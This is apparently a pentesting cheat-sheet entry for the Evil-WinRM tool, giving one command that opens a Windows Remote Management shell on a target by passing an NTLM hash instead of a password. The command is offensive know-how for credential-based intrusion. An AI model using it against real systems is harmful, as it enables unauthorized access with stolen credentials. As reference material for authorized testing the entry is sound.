---
title: Evil-WinRM
desc: Windows Remote Management shell for pentesting. It's also used for Pass The Hash.
tags: [ActiveDirectory, Linux, PassTheHash, Windows]
alts: []
website: https://github.com/Hackplayers/evil-winrm
---

## Pass The Hash

```sh
# Specify hash instead of password
evil-winrm -i 10.0.0.1 -u admin -H 0e0363213e37b94221497260b0bcb4fc
```